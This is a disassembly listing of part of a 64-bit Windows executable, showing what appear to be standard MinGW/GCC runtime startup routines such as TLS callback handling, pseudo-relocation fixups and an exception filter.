   140001762:	48 83 ec 28          	sub    $0x28,%rsp
   140001766:	48 8b 05 63 89 00 00 	mov    0x8963(%rip),%rax        # 0x14000a0d0
   14000176d:	83 38 02             	cmpl   $0x2,(%rax)
   140001770:	74 06                	je     0x140001778
   140001772:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140001778:	83 fa 01             	cmp    $0x1,%edx
   14000177b:	74 3c                	je     0x1400017b9
   14000177d:	83 fa 02             	cmp    $0x2,%edx
   140001780:	75 41                	jne    0x1400017c3
   140001782:	48 8d 35 e7 a1 00 00 	lea    0xa1e7(%rip),%rsi        # 0x14000b970
   140001789:	48 8d 3d e0 a1 00 00 	lea    0xa1e0(%rip),%rdi        # 0x14000b970
   140001790:	48 39 f7             	cmp    %rsi,%rdi
   140001793:	75 14                	jne    0x1400017a9
   140001795:	eb 2c                	jmp    0x1400017c3
   140001797:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000179e:	00 00 
   1400017a0:	48 83 c7 08          	add    $0x8,%rdi
   1400017a4:	48 39 fe             	cmp    %rdi,%rsi
   1400017a7:	74 1a                	je     0x1400017c3
   1400017a9:	48 8b 07             	mov    (%rdi),%rax
   1400017ac:	48 85 c0             	test   %rax,%rax
   1400017af:	74 ef                	je     0x1400017a0
   1400017b1:	ff 15 51 f8 28 00    	call   *0x28f851(%rip)        # 0x140291008
   1400017b7:	eb e7                	jmp    0x1400017a0
   1400017b9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400017be:	e8 1d 09 00 00       	call   0x1400020e0
   1400017c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017c8:	48 83 c4 28          	add    $0x28,%rsp
   1400017cc:	5f                   	pop    %rdi
   1400017cd:	5e                   	pop    %rsi
   1400017ce:	c3                   	ret
   1400017cf:	90                   	nop
   1400017d0:	31 c0                	xor    %eax,%eax
   1400017d2:	c3                   	ret
   1400017d3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400017da:	84 00 00 00 00 00 
   1400017e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400017e4:	83 fa 03             	cmp    $0x3,%edx
   1400017e7:	74 04                	je     0x1400017ed
   1400017e9:	85 d2                	test   %edx,%edx
   1400017eb:	75 05                	jne    0x1400017f2
   1400017ed:	e8 ee 08 00 00       	call   0x1400020e0
   1400017f2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017f7:	48 83 c4 28          	add    $0x28,%rsp
   1400017fb:	c3                   	ret
   1400017fc:	cc                   	int3
   1400017fd:	cc                   	int3
   1400017fe:	cc                   	int3
   1400017ff:	cc                   	int3
   140001800:	56                   	push   %rsi
   140001801:	57                   	push   %rdi
   140001802:	48 83 ec 38          	sub    $0x38,%rsp
   140001806:	48 89 ce             	mov    %rcx,%rsi
   140001809:	8b 01                	mov    (%rcx),%eax
   14000180b:	ff c8                	dec    %eax
   14000180d:	83 f8 05             	cmp    $0x5,%eax
   140001810:	77 12                	ja     0x140001824
   140001812:	48 98                	cltq
   140001814:	48 8d 0d d1 89 00 00 	lea    0x89d1(%rip),%rcx        # 0x14000a1ec
   14000181b:	48 63 3c 81          	movslq (%rcx,%rax,4),%rdi
   14000181f:	48 01 cf             	add    %rcx,%rdi
   140001822:	eb 07                	jmp    0x14000182b
   140001824:	48 8d 3d 86 89 00 00 	lea    0x8986(%rip),%rdi        # 0x14000a1b1
   14000182b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001830:	e8 5b 0a 00 00       	call   0x140002290
   140001835:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   140001839:	0f 10 46 10          	movups 0x10(%rsi),%xmm0
   14000183d:	f2 0f 10 4e 20       	movsd  0x20(%rsi),%xmm1
   140001842:	f2 0f 11 4c 24 30    	movsd  %xmm1,0x30(%rsp)
   140001848:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000184d:	48 8d 15 6b 89 00 00 	lea    0x896b(%rip),%rdx        # 0x14000a1bf
   140001854:	48 89 c1             	mov    %rax,%rcx
   140001857:	49 89 f8             	mov    %rdi,%r8
   14000185a:	e8 b1 84 00 00       	call   0x140009d10
   14000185f:	31 c0                	xor    %eax,%eax
   140001861:	48 83 c4 38          	add    $0x38,%rsp
   140001865:	5f                   	pop    %rdi
   140001866:	5e                   	pop    %rsi
   140001867:	c3                   	ret
   140001868:	cc                   	int3
   140001869:	cc                   	int3
   14000186a:	cc                   	int3
   14000186b:	cc                   	int3
   14000186c:	cc                   	int3
   14000186d:	cc                   	int3
   14000186e:	cc                   	int3
   14000186f:	cc                   	int3
   140001870:	db e3                	fninit
   140001872:	c3                   	ret
   140001873:	cc                   	int3
   140001874:	cc                   	int3
   140001875:	cc                   	int3
   140001876:	cc                   	int3
   140001877:	cc                   	int3
   140001878:	cc                   	int3
   140001879:	cc                   	int3
   14000187a:	cc                   	int3
   14000187b:	cc                   	int3
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	55                   	push   %rbp
   140001881:	41 57                	push   %r15
   140001883:	41 56                	push   %r14
   140001885:	41 55                	push   %r13
   140001887:	41 54                	push   %r12
   140001889:	56                   	push   %rsi
   14000188a:	57                   	push   %rdi
   14000188b:	53                   	push   %rbx
   14000188c:	48 83 ec 18          	sub    $0x18,%rsp
   140001890:	48 8d 6c 24 10       	lea    0x10(%rsp),%rbp
   140001895:	80 3d 6c c5 28 00 00 	cmpb   $0x0,0x28c56c(%rip)        # 0x14028de08
   14000189c:	0f 85 6d 01 00 00    	jne    0x140001a0f
   1400018a2:	c6 05 5f c5 28 00 01 	movb   $0x1,0x28c55f(%rip)        # 0x14028de08
   1400018a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400018ad:	e8 6e 0b 00 00       	call   0x140002420
   1400018b2:	48 83 c4 20          	add    $0x20,%rsp
   1400018b6:	48 98                	cltq
   1400018b8:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400018bc:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   1400018c3:	00 
   1400018c4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400018c8:	e8 93 0d 00 00       	call   0x140002660
   1400018cd:	48 29 c4             	sub    %rax,%rsp
   1400018d0:	48 89 e0             	mov    %rsp,%rax
   1400018d3:	48 89 05 36 c5 28 00 	mov    %rax,0x28c536(%rip)        # 0x14028de10
   1400018da:	c7 05 34 c5 28 00 00 	movl   $0x0,0x28c534(%rip)        # 0x14028de18
   1400018e1:	00 00 00 
   1400018e4:	48 8b 3d c5 8a 00 00 	mov    0x8ac5(%rip),%rdi        # 0x14000a3b0
   1400018eb:	48 89 f8             	mov    %rdi,%rax
   1400018ee:	48 2b 05 c3 8a 00 00 	sub    0x8ac3(%rip),%rax        # 0x14000a3b8
   1400018f5:	48 83 f8 07          	cmp    $0x7,%rax
   1400018f9:	0f 8e 10 01 00 00    	jle    0x140001a0f
   1400018ff:	48 8b 1d b2 8a 00 00 	mov    0x8ab2(%rip),%rbx        # 0x14000a3b8
   140001906:	48 89 f8             	mov    %rdi,%rax
   140001909:	48 29 d8             	sub    %rbx,%rax
   14000190c:	48 83 f8 0c          	cmp    $0xc,%rax
   140001910:	7c 2c                	jl     0x14000193e
   140001912:	48 8b 1d 9f 8a 00 00 	mov    0x8a9f(%rip),%rbx        # 0x14000a3b8
   140001919:	83 3b 00             	cmpl   $0x0,(%rbx)
   14000191c:	75 2f                	jne    0x14000194d
   14000191e:	48 8b 1d 93 8a 00 00 	mov    0x8a93(%rip),%rbx        # 0x14000a3b8
   140001925:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001929:	75 22                	jne    0x14000194d
   14000192b:	48 8b 05 86 8a 00 00 	mov    0x8a86(%rip),%rax        # 0x14000a3b8
   140001932:	48 8d 58 0c          	lea    0xc(%rax),%rbx
   140001936:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   14000193a:	48 0f 45 d8          	cmovne %rax,%rbx
   14000193e:	83 3b 00             	cmpl   $0x0,(%rbx)
   140001941:	75 0a                	jne    0x14000194d
   140001943:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   140001947:	0f 84 d3 00 00 00    	je     0x140001a20
   14000194d:	48 3b 1d 5c 8a 00 00 	cmp    0x8a5c(%rip),%rbx        # 0x14000a3b0
   140001954:	73 48                	jae    0x14000199e
   140001956:	4c 8b 35 ab 86 00 00 	mov    0x86ab(%rip),%r14        # 0x14000a008
   14000195d:	48 8d 75 04          	lea    0x4(%rbp),%rsi
   140001961:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001968:	0f 1f 84 00 00 00 00 
   14000196f:	00 
   140001970:	8b 03                	mov    (%rbx),%eax
   140001972:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140001975:	42 03 04 31          	add    (%rcx,%r14,1),%eax
   140001979:	4c 01 f1             	add    %r14,%rcx
   14000197c:	89 45 04             	mov    %eax,0x4(%rbp)
   14000197f:	48 83 ec 20          	sub    $0x20,%rsp
   140001983:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001989:	48 89 f2             	mov    %rsi,%rdx
   14000198c:	e8 0f 02 00 00       	call   0x140001ba0
   140001991:	48 83 c4 20          	add    $0x20,%rsp
   140001995:	48 83 c3 08          	add    $0x8,%rbx
   140001999:	48 39 fb             	cmp    %rdi,%rbx
   14000199c:	72 d2                	jb     0x140001970
   14000199e:	8b 05 74 c4 28 00    	mov    0x28c474(%rip),%eax        # 0x14028de18
   1400019a4:	85 c0                	test   %eax,%eax
   1400019a6:	7e 67                	jle    0x140001a0f
   1400019a8:	bf 10 00 00 00       	mov    $0x10,%edi
   1400019ad:	48 8b 15 5c c4 28 00 	mov    0x28c45c(%rip),%rdx        # 0x14028de10
   1400019b4:	31 db                	xor    %ebx,%ebx
   1400019b6:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   1400019ba:	4c 8b 35 e7 a2 00 00 	mov    0xa2e7(%rip),%r14        # 0x14000bca8
   1400019c1:	eb 1c                	jmp    0x1400019df
   1400019c3:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400019ca:	84 00 00 00 00 00 
   1400019d0:	48 ff c3             	inc    %rbx
   1400019d3:	48 63 c8             	movslq %eax,%rcx
   1400019d6:	48 83 c7 28          	add    $0x28,%rdi
   1400019da:	48 39 cb             	cmp    %rcx,%rbx
   1400019dd:	7d 30                	jge    0x140001a0f
   1400019df:	44 8b 44 3a f0       	mov    -0x10(%rdx,%rdi,1),%r8d
   1400019e4:	45 85 c0             	test   %r8d,%r8d
   1400019e7:	74 e7                	je     0x1400019d0
   1400019e9:	48 8b 4c 3a f8       	mov    -0x8(%rdx,%rdi,1),%rcx
   1400019ee:	48 8b 14 3a          	mov    (%rdx,%rdi,1),%rdx
   1400019f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400019f6:	49 89 f1             	mov    %rsi,%r9
   1400019f9:	41 ff d6             	call   *%r14
   1400019fc:	48 83 c4 20          	add    $0x20,%rsp
   140001a00:	48 8b 15 09 c4 28 00 	mov    0x28c409(%rip),%rdx        # 0x14028de10
   140001a07:	8b 05 0b c4 28 00    	mov    0x28c40b(%rip),%eax        # 0x14028de18
   140001a0d:	eb c1                	jmp    0x1400019d0
   140001a0f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140001a13:	5b                   	pop    %rbx
   140001a14:	5f                   	pop    %rdi
   140001a15:	5e                   	pop    %rsi
   140001a16:	41 5c                	pop    %r12
   140001a18:	41 5d                	pop    %r13
   140001a1a:	41 5e                	pop    %r14
   140001a1c:	41 5f                	pop    %r15
   140001a1e:	5d                   	pop    %rbp
   140001a1f:	c3                   	ret
   140001a20:	8b 53 08             	mov    0x8(%rbx),%edx
   140001a23:	83 fa 01             	cmp    $0x1,%edx
   140001a26:	0f 85 5b 01 00 00    	jne    0x140001b87
   140001a2c:	48 83 c3 0c          	add    $0xc,%rbx
   140001a30:	48 3b 1d 79 89 00 00 	cmp    0x8979(%rip),%rbx        # 0x14000a3b0
   140001a37:	0f 83 61 ff ff ff    	jae    0x14000199e
   140001a3d:	4c 8b 35 c4 85 00 00 	mov    0x85c4(%rip),%r14        # 0x14000a008
   140001a44:	4c 8d 3d bd 87 00 00 	lea    0x87bd(%rip),%r15        # 0x14000a208
   140001a4b:	41 bc 8b 00 00 00    	mov    $0x8b,%r12d
   140001a51:	48 8d 75 f8          	lea    -0x8(%rbp),%rsi
   140001a55:	49 bd 00 00 00 00 ff 	movabs $0xffffffff00000000,%r13
   140001a5c:	ff ff ff 
   140001a5f:	eb 1c                	jmp    0x140001a7d
   140001a61:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001a68:	0f 1f 84 00 00 00 00 
   140001a6f:	00 
   140001a70:	48 83 c3 0c          	add    $0xc,%rbx
   140001a74:	48 39 fb             	cmp    %rdi,%rbx
   140001a77:	0f 83 21 ff ff ff    	jae    0x14000199e
   140001a7d:	8b 4b 08             	mov    0x8(%rbx),%ecx
   140001a80:	41 89 c8             	mov    %ecx,%r8d
   140001a83:	41 81 e0 f8 00 00 00 	and    $0xf8,%r8d
   140001a8a:	41 83 c0 f8          	add    $0xfffffff8,%r8d
   140001a8e:	41 0f ac c8 03       	shrd   $0x3,%ecx,%r8d
   140001a93:	41 83 f8 07          	cmp    $0x7,%r8d
   140001a97:	0f 87 d7 00 00 00    	ja     0x140001b74
   140001a9d:	8b 13                	mov    (%rbx),%edx
   140001a9f:	8b 43 04             	mov    0x4(%rbx),%eax
   140001aa2:	4c 01 f0             	add    %r14,%rax
   140001aa5:	4e 8b 0c 32          	mov    (%rdx,%r14,1),%r9
   140001aa9:	4f 63 14 87          	movslq (%r15,%r8,4),%r10
   140001aad:	4d 01 fa             	add    %r15,%r10
   140001ab0:	41 ff e2             	jmp    *%r10
   140001ab3:	44 0f b6 18          	movzbl (%rax),%r11d
   140001ab7:	4d 8d 93 00 ff ff ff 	lea    -0x100(%r11),%r10
   140001abe:	45 84 db             	test   %r11b,%r11b
   140001ac1:	eb 1b                	jmp    0x140001ade
   140001ac3:	44 0f b7 18          	movzwl (%rax),%r11d
   140001ac7:	4d 8d 93 00 00 ff ff 	lea    -0x10000(%r11),%r10
   140001ace:	66 45 85 db          	test   %r11w,%r11w
   140001ad2:	eb 0a                	jmp    0x140001ade
   140001ad4:	44 8b 18             	mov    (%rax),%r11d
   140001ad7:	4f 8d 14 2b          	lea    (%r11,%r13,1),%r10
   140001adb:	45 85 db             	test   %r11d,%r11d
   140001ade:	4d 0f 49 d3          	cmovns %r11,%r10
   140001ae2:	eb 03                	jmp    0x140001ae7
   140001ae4:	4c 8b 10             	mov    (%rax),%r10
   140001ae7:	4c 01 f2             	add    %r14,%rdx
   140001aea:	49 29 d2             	sub    %rdx,%r10
   140001aed:	4d 01 ca             	add    %r9,%r10
   140001af0:	4c 89 55 f8          	mov    %r10,-0x8(%rbp)
   140001af4:	0f b6 d1             	movzbl %cl,%edx
   140001af7:	83 fa 3f             	cmp    $0x3f,%edx
   140001afa:	77 26                	ja     0x140001b22
   140001afc:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b03:	89 d1                	mov    %edx,%ecx
   140001b05:	49 d3 e3             	shl    %cl,%r11
   140001b08:	49 f7 d3             	not    %r11
   140001b0b:	4d 39 da             	cmp    %r11,%r10
   140001b0e:	7f 4c                	jg     0x140001b5c
   140001b10:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140001b13:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140001b1a:	49 d3 e3             	shl    %cl,%r11
   140001b1d:	4d 39 da             	cmp    %r11,%r10
   140001b20:	7c 3a                	jl     0x140001b5c
   140001b22:	41 83 f8 07          	cmp    $0x7,%r8d
   140001b26:	0f 87 44 ff ff ff    	ja     0x140001a70
   140001b2c:	45 0f a3 c4          	bt     %r8d,%r12d
   140001b30:	0f 83 3a ff ff ff    	jae    0x140001a70
   140001b36:	49 63 c8             	movslq %r8d,%rcx
   140001b39:	48 8d 15 30 88 00 00 	lea    0x8830(%rip),%rdx        # 0x14000a370
   140001b40:	4c 8b 04 ca          	mov    (%rdx,%rcx,8),%r8
   140001b44:	48 83 ec 20          	sub    $0x20,%rsp
   140001b48:	48 89 c1             	mov    %rax,%rcx
   140001b4b:	48 89 f2             	mov    %rsi,%rdx
   140001b4e:	e8 4d 00 00 00       	call   0x140001ba0
   140001b53:	48 83 c4 20          	add    $0x20,%rsp
   140001b57:	e9 14 ff ff ff       	jmp    0x140001a70
   140001b5c:	48 83 ec 30          	sub    $0x30,%rsp
   140001b60:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140001b65:	48 8d 0d 18 87 00 00 	lea    0x8718(%rip),%rcx        # 0x14000a284
   140001b6c:	49 89 c0             	mov    %rax,%r8
   140001b6f:	e8 cc 01 00 00       	call   0x140001d40
   140001b74:	0f b6 d1             	movzbl %cl,%edx
   140001b77:	48 83 ec 20          	sub    $0x20,%rsp
   140001b7b:	48 8d 0d d8 86 00 00 	lea    0x86d8(%rip),%rcx        # 0x14000a25a
   140001b82:	e8 b9 01 00 00       	call   0x140001d40
   140001b87:	48 83 ec 20          	sub    $0x20,%rsp
   140001b8b:	48 8d 0d 96 86 00 00 	lea    0x8696(%rip),%rcx        # 0x14000a228
   140001b92:	e8 a9 01 00 00       	call   0x140001d40
   140001b97:	cc                   	int3
   140001b98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001b9f:	00 
   140001ba0:	41 57                	push   %r15
   140001ba2:	41 56                	push   %r14
   140001ba4:	41 54                	push   %r12
   140001ba6:	56                   	push   %rsi
   140001ba7:	57                   	push   %rdi
   140001ba8:	53                   	push   %rbx
   140001ba9:	48 83 ec 58          	sub    $0x58,%rsp
   140001bad:	4c 89 c7             	mov    %r8,%rdi
   140001bb0:	48 89 d3             	mov    %rdx,%rbx
   140001bb3:	48 89 ce             	mov    %rcx,%rsi
   140001bb6:	44 8b 3d 5b c2 28 00 	mov    0x28c25b(%rip),%r15d        # 0x14028de18
   140001bbd:	45 85 ff             	test   %r15d,%r15d
   140001bc0:	7e 47                	jle    0x140001c09
   140001bc2:	48 8b 05 47 c2 28 00 	mov    0x28c247(%rip),%rax        # 0x14028de10
   140001bc9:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001bd0:	00 
   140001bd1:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140001bd5:	31 d2                	xor    %edx,%edx
   140001bd7:	eb 10                	jmp    0x140001be9
   140001bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001be0:	48 83 c2 28          	add    $0x28,%rdx
   140001be4:	48 39 d1             	cmp    %rdx,%rcx
   140001be7:	74 23                	je     0x140001c0c
   140001be9:	4c 8b 44 10 18       	mov    0x18(%rax,%rdx,1),%r8
   140001bee:	49 39 f0             	cmp    %rsi,%r8
   140001bf1:	77 ed                	ja     0x140001be0
   140001bf3:	4c 8b 4c 10 20       	mov    0x20(%rax,%rdx,1),%r9
   140001bf8:	45 8b 49 08          	mov    0x8(%r9),%r9d
   140001bfc:	4d 01 c8             	add    %r9,%r8
   140001bff:	49 39 f0             	cmp    %rsi,%r8
   140001c02:	76 dc                	jbe    0x140001be0
   140001c04:	e9 ce 00 00 00       	jmp    0x140001cd7
   140001c09:	45 31 ff             	xor    %r15d,%r15d
   140001c0c:	48 89 f1             	mov    %rsi,%rcx
   140001c0f:	e8 9c 07 00 00       	call   0x1400023b0
   140001c14:	48 85 c0             	test   %rax,%rax
   140001c17:	0f 84 d7 00 00 00    	je     0x140001cf4
   140001c1d:	49 89 c6             	mov    %rax,%r14
   140001c20:	48 8b 05 e9 c1 28 00 	mov    0x28c1e9(%rip),%rax        # 0x14028de10
   140001c27:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140001c2e:	00 
   140001c2f:	4c 8d 24 89          	lea    (%rcx,%rcx,4),%r12
   140001c33:	4e 89 74 20 20       	mov    %r14,0x20(%rax,%r12,1)
   140001c38:	42 c7 04 20 00 00 00 	movl   $0x0,(%rax,%r12,1)
   140001c3f:	00 
   140001c40:	e8 8b 08 00 00       	call   0x1400024d0
   140001c45:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   140001c49:	48 01 c1             	add    %rax,%rcx
   140001c4c:	48 8b 05 bd c1 28 00 	mov    0x28c1bd(%rip),%rax        # 0x14028de10
   140001c53:	4a 89 4c 20 18       	mov    %rcx,0x18(%rax,%r12,1)
   140001c58:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001c5d:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140001c63:	ff 15 47 a0 00 00    	call   *0xa047(%rip)        # 0x14000bcb0
   140001c69:	48 85 c0             	test   %rax,%rax
   140001c6c:	0f 84 91 00 00 00    	je     0x140001d03
   140001c72:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140001c76:	83 f8 07             	cmp    $0x7,%eax
   140001c79:	7e 13                	jle    0x140001c8e
   140001c7b:	83 f8 08             	cmp    $0x8,%eax
   140001c7e:	74 51                	je     0x140001cd1
   140001c80:	83 f8 40             	cmp    $0x40,%eax
   140001c83:	74 4c                	je     0x140001cd1
   140001c85:	3d 80 00 00 00       	cmp    $0x80,%eax
   140001c8a:	74 45                	je     0x140001cd1
   140001c8c:	eb 10                	jmp    0x140001c9e
   140001c8e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001c94:	83 f8 02             	cmp    $0x2,%eax
   140001c97:	74 0b                	je     0x140001ca4
   140001c99:	83 f8 04             	cmp    $0x4,%eax
   140001c9c:	74 33                	je     0x140001cd1
   140001c9e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001ca4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001ca9:	48 8b 05 60 c1 28 00 	mov    0x28c160(%rip),%rax        # 0x14028de10
   140001cb0:	4f 8d 14 bf          	lea    (%r15,%r15,4),%r10
   140001cb4:	4e 8d 0c d0          	lea    (%rax,%r10,8),%r9
   140001cb8:	4a 89 4c d0 08       	mov    %rcx,0x8(%rax,%r10,8)
   140001cbd:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140001cc2:	4a 89 54 d0 10       	mov    %rdx,0x10(%rax,%r10,8)
   140001cc7:	ff 15 db 9f 00 00    	call   *0x9fdb(%rip)        # 0x14000bca8
   140001ccd:	85 c0                	test   %eax,%eax
   140001ccf:	74 52                	je     0x140001d23
   140001cd1:	ff 05 41 c1 28 00    	incl   0x28c141(%rip)        # 0x14028de18
   140001cd7:	48 89 f1             	mov    %rsi,%rcx
   140001cda:	48 89 da             	mov    %rbx,%rdx
   140001cdd:	49 89 f8             	mov    %rdi,%r8
   140001ce0:	e8 cb 7f 00 00       	call   0x140009cb0
   140001ce5:	90                   	nop
   140001ce6:	48 83 c4 58          	add    $0x58,%rsp
   140001cea:	5b                   	pop    %rbx
   140001ceb:	5f                   	pop    %rdi
   140001cec:	5e                   	pop    %rsi
   140001ced:	41 5c                	pop    %r12
   140001cef:	41 5e                	pop    %r14
   140001cf1:	41 5f                	pop    %r15
   140001cf3:	c3                   	ret
   140001cf4:	48 8d 0d dc 85 00 00 	lea    0x85dc(%rip),%rcx        # 0x14000a2d7
   140001cfb:	48 89 f2             	mov    %rsi,%rdx
   140001cfe:	e8 3d 00 00 00       	call   0x140001d40
   140001d03:	41 8b 56 08          	mov    0x8(%r14),%edx
   140001d07:	48 8b 05 02 c1 28 00 	mov    0x28c102(%rip),%rax        # 0x14028de10
   140001d0e:	4b 8d 0c bf          	lea    (%r15,%r15,4),%rcx
   140001d12:	4c 8b 44 c8 18       	mov    0x18(%rax,%rcx,8),%r8
   140001d17:	48 8d 0d d9 85 00 00 	lea    0x85d9(%rip),%rcx        # 0x14000a2f7
   140001d1e:	e8 1d 00 00 00       	call   0x140001d40
   140001d23:	ff 15 4f 9f 00 00    	call   *0x9f4f(%rip)        # 0x14000bc78
   140001d29:	48 8d 0d f8 85 00 00 	lea    0x85f8(%rip),%rcx        # 0x14000a328
   140001d30:	89 c2                	mov    %eax,%edx
   140001d32:	e8 09 00 00 00       	call   0x140001d40
   140001d37:	cc                   	int3
   140001d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001d3f:	00 
   140001d40:	56                   	push   %rsi
   140001d41:	48 83 ec 30          	sub    $0x30,%rsp
   140001d45:	48 89 ce             	mov    %rcx,%rsi
   140001d48:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140001d4d:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140001d52:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140001d57:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140001d5c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001d61:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d66:	e8 25 05 00 00       	call   0x140002290
   140001d6b:	48 8d 0d dd 85 00 00 	lea    0x85dd(%rip),%rcx        # 0x14000a34f
   140001d72:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001d77:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001d7d:	49 89 c1             	mov    %rax,%r9
   140001d80:	e8 9b 7f 00 00       	call   0x140009d20
   140001d85:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d8a:	e8 01 05 00 00       	call   0x140002290
   140001d8f:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140001d94:	48 89 c1             	mov    %rax,%rcx
   140001d97:	48 89 f2             	mov    %rsi,%rdx
   140001d9a:	e8 91 7f 00 00       	call   0x140009d30
   140001d9f:	e8 9c 7f 00 00       	call   0x140009d40
   140001da4:	cc                   	int3
   140001da5:	cc                   	int3
   140001da6:	cc                   	int3
   140001da7:	cc                   	int3
   140001da8:	cc                   	int3
   140001da9:	cc                   	int3
   140001daa:	cc                   	int3
   140001dab:	cc                   	int3
   140001dac:	cc                   	int3
   140001dad:	cc                   	int3
   140001dae:	cc                   	int3
   140001daf:	cc                   	int3
   140001db0:	48 83 ec 48          	sub    $0x48,%rsp
   140001db4:	48 8b 05 65 c0 28 00 	mov    0x28c065(%rip),%rax        # 0x14028de20
   140001dbb:	48 85 c0             	test   %rax,%rax
   140001dbe:	74 2c                	je     0x140001dec
   140001dc0:	f2 0f 10 44 24 70    	movsd  0x70(%rsp),%xmm0
   140001dc6:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140001dca:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001dcf:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140001dd5:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   140001ddb:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140001de1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001de6:	ff 15 1c f2 28 00    	call   *0x28f21c(%rip)        # 0x140291008
   140001dec:	90                   	nop
   140001ded:	48 83 c4 48          	add    $0x48,%rsp
   140001df1:	c3                   	ret
   140001df2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140001df9:	1f 84 00 00 00 00 00 
   140001e00:	48 89 0d 19 c0 28 00 	mov    %rcx,0x28c019(%rip)        # 0x14028de20
   140001e07:	e9 44 7f 00 00       	jmp    0x140009d50
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	56                   	push   %rsi
   140001e11:	57                   	push   %rdi
   140001e12:	53                   	push   %rbx
   140001e13:	48 83 ec 20          	sub    $0x20,%rsp
   140001e17:	48 89 cf             	mov    %rcx,%rdi
   140001e1a:	48 8b 09             	mov    (%rcx),%rcx
   140001e1d:	8b 01                	mov    (%rcx),%eax
   140001e1f:	89 c2                	mov    %eax,%edx
   140001e21:	81 e2 ff ff ff 20    	and    $0x20ffffff,%edx
   140001e27:	81 fa 43 43 47 20    	cmp    $0x20474343,%edx
   140001e2d:	75 0f                	jne    0x140001e3e
   140001e2f:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e34:	f6 41 04 01          	testb  $0x1,0x4(%rcx)
   140001e38:	0f 84 22 01 00 00    	je     0x140001f60
   140001e3e:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140001e43:	3d 1c 00 00 c0       	cmp    $0xc000001c,%eax
   140001e48:	7e 59                	jle    0x140001ea3
   140001e4a:	8d 88 74 ff ff 3f    	lea    0x3fffff74(%rax),%ecx
   140001e50:	83 f9 0a             	cmp    $0xa,%ecx
   140001e53:	77 77                	ja     0x140001ecc
   140001e55:	48 8d 05 64 85 00 00 	lea    0x8564(%rip),%rax        # 0x14000a3c0
   140001e5c:	48 63 0c 88          	movslq (%rax,%rcx,4),%rcx
   140001e60:	48 01 c1             	add    %rax,%rcx
   140001e63:	ff e1                	jmp    *%rcx
   140001e65:	31 db                	xor    %ebx,%ebx
   140001e67:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e6c:	31 d2                	xor    %edx,%edx
   140001e6e:	e8 ed 7e 00 00       	call   0x140009d60
   140001e73:	48 85 c0             	test   %rax,%rax
   140001e76:	0f 84 a7 00 00 00    	je     0x140001f23
   140001e7c:	48 83 f8 01          	cmp    $0x1,%rax
   140001e80:	75 40                	jne    0x140001ec2
